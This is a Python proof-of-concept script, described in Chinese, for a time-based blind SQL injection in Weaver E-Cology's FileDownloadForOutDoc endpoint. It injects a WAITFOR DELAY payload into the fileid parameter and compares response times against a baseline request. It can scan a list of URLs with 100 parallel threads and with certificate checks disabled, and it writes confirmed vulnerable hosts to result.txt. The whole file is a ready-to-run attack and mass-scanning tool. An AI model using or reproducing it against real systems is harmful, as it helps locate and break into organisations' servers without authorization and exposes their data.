import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """__________             ___       __    _____    __________   _________     ______                      
___  ____/_____ _________ |     / /_______(_)   ___  ____/   __  ____/________  /____________ _____  __
__  /_   _  __ `/_  __ \_ | /| / /_  _ \_  /    __  __/_______  /    _  __ \_  /_  __ \_  __ `/_  / / /
_  __/   / /_/ /_  / / /_ |/ |/ / /  __/  /     _  /___/_____/ /___  / /_/ /  / / /_/ /  /_/ /_  /_/ / 
/_/      \__,_/ /_/ /_/____/|__/  \___//_/      /_____/      \____/  \____//_/  \____/_\__, / _\__, /  
                                                                                      /____/  /____/   """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微 E-Cology 某版本 SQL注入漏洞 POC')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+"0:0:5"'
    payload2 = '/weaver/weaver.file.FileDownloadForOutDoc/?fileid=123'
    headers = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
    }
    try:
        res1 = requests.get(url=target+payload1,headers=headers,verify=False,timeout=10)
        res2 = requests.get(url=target+payload2,headers=headers,verify=False,timeout=10)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        time = time1-time2
        if time >= 4:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()